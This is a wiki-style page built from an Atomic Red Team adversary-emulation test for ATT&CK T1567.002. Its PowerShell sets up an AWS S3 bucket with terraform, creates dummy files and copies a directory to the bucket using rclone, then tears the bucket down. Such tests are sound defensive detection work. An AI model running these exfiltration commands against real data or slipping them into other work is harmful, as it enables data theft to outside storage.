---
atomic_guid: "a4b74723-5cee-4300-91c3-5e34166909b4"
title: "Exfiltrate data with rclone to cloud Storage - AWS S3"
framework: "atomic"
generated: "true"
attack_technique_id: "T1567.002"
attack_technique_name: "Exfiltration Over Web Service: Exfiltration to Cloud Storage"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567.002/T1567.002.yaml"
build_date: "2026-04-27 19:12:28"
executor: "powershell"
aliases:
  - "a4b74723-5cee-4300-91c3-5e34166909b4"
  - "Exfiltrate data with rclone to cloud Storage - AWS S3"
platforms:
  - "linux"
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

This test uses rclone to exfiltrate data to a remote cloud storage instance. (AWS S3)
See https://thedfirreport.com/2022/06/16/sans-ransomware-summit-2022-can-you-detect-this/

## ATT&CK Mapping

- [[kb/attack/techniques/T1567-exfiltration_over_web_service#^t1567002-exfiltration-to-cloud-storage|T1567.002: Exfiltration to Cloud Storage]]

## Input Arguments

### aws_access_key

- description: AWS Access Key
- type: string

### aws_profile

- description: AWS Profile
- type: string
- default: default

### aws_region

- description: AWS Region
- type: string
- default: us-east-1

### aws_secret_key

- description: AWS Secret Key
- type: string

### exfil_directory

- description: Directory to exfiltrate
- type: string
- default: PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/

### rclone_path

- description: Directory of rclone.exe
- type: path
- default: PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*/

### terraform_path

- description: Directory of terraform
- type: path
- default: PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*

## Dependencies

rclone must exist at (#{rclone_path})

### Prerequisite Check

```powershell
if (Test-Path "#{rclone_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder/../ExternalPayloads/" -ErrorAction Ignore -Force | Out-Null
$arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()
$operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()
if ($operatingSystem -match "darwin") {
  Invoke-WebRequest "https://downloads.rclone.org/rclone-current-osx-$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/rclone.zip"
} elseif ($operatingSystem -match "linux") {
  Invoke-WebRequest "https://downloads.rclone.org/rclone-current-linux-$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/rclone.zip"
}
Expand-archive -path "PathToAtomicsFolder/../ExternalPayloads/rclone.zip" -DestinationPath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/" -force
```

terraform must exist at (#{terraform_path})

### Prerequisite Check

```powershell
if (Test-Path "#{terraform_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder/../ExternalPayloads/" -ErrorAction Ignore -Force | Out-Null
$arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()
$operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()
if ($operatingSystem -match "darwin") {
  Invoke-WebRequest "https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_darwin_$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/terraform.zip"
} elseif ($operatingSystem -match "linux") {
  Invoke-WebRequest "https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_linux_$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/terraform.zip"
}
Expand-archive -path "PathToAtomicsFolder/../ExternalPayloads/terraform.zip" -DestinationPath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v1.10.5/" -force
```

Must provide a valid directory or file path to exfiltrate to AWS S3

### Prerequisite Check

```powershell
if (Test-Path "#{exfil_directory}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data" -ErrorAction Ignore -Force | Out-Null
foreach($fileSuffix in 1..10) {
  Set-Content "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/test$fileSuffix.txt" "This is a test file"
}
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
Write-Host "Deploying AWS infrastructure... " -NoNewLine
$awsAccessKey = "#{aws_access_key}"
$awsSecretKey = "#{aws_secret_key}"
cd PathToAtomicsFolder/T1567.002/src/
if ($awsAccessKey -eq "" -or $awsSecretKey -eq "") {
  $env:AWS_PROFILE = "#{aws_profile}"
} else {
  $env:AWS_ACCESS_KEY_ID = "$awsAccessKey"
  $env:AWS_SECRET_ACCESS_KEY = "$awsSecretKey"
}
$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform init
$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform apply -var "aws_region=#{aws_region}" -auto-approve
Write-Host "Done!"
Write-Host "Generating rclone config... " -NoNewLine
$config = @"
[exfils3]
type = s3
provider = AWS
env_auth = true
region = #{aws_region}
"@
$config | Out-File -FilePath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf" -Encoding ascii
Write-Host "Done!"
Write-Host "Exfiltrating data... " -NoNewLine
$bucket = "$(PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform output bucket)".Replace("`"","")
cd PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone-v*
$null = ./rclone copy --max-size 1700k "PathToAtomicsFolder/../ExternalPayloads/T1567.002/data/" exfils3:$bucket --config "PathToAtomicsFolder/../ExternalPayloads/T1567.002/rclone.conf"
Write-Host "Done!"
```

### Cleanup

```powershell
Write-Host "Destroying AWS infrastructure... " -NoNewLine
$awsAccessKey = "#{aws_access_key}"
$awsSecretKey = "#{aws_secret_key}"
cd PathToAtomicsFolder/T1567.002/src/
if ($awsAccessKey -eq "" -or $awsSecretKey -eq "") {
  $env:AWS_PROFILE = "#{aws_profile}"
} else {
  $env:AWS_ACCESS_KEY_ID = "$awsAccessKey"
  $env:AWS_SECRET_ACCESS_KEY = "$awsSecretKey"
}
$null = PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v*/terraform destroy -var "aws_region=#{aws_region}" -auto-approve
Write-Host "Done!"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567.002/T1567.002.yaml)
